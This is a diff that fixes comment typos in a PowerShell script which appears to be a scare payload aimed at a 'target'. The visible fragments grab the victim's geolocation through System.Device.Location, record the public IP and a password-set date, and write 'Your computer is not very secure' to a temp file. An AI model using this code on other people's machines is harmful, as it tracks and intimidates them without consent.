@@ -75,14 +75,14 @@ echo "`nYour computer is not very secure" >> $Env:temp\foo.txt
 <#
 
 .NOTES 
-	This is to get the current Latitide and Longitude of your target
+	This is to get the current Latitude and Longitude of your target
 #>
 
 function Get-GeoLocation{
 	try {
 	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
 	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current locaton
+	$GeoWatcher.Start() #Begin resolving current location
 
 	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
 		Start-Sleep -Milliseconds 100 #Wait for discovery.
@@ -91,7 +91,7 @@ function Get-GeoLocation{
 	if ($GeoWatcher.Permission -eq 'Denied'){
 		Write-Error 'Access Denied for Location Information'
 	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
 		
 	}
 	}
@@ -168,7 +168,7 @@ if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
     
     }
  
- # If no password set date is detected funtion will return $null to cancel Sapi Speak
+ # If no password set date is detected function will return $null to cancel Sapi Speak
 
     # Write Error is just for troubleshooting 
     catch {Write-Error "Day password set not found" 
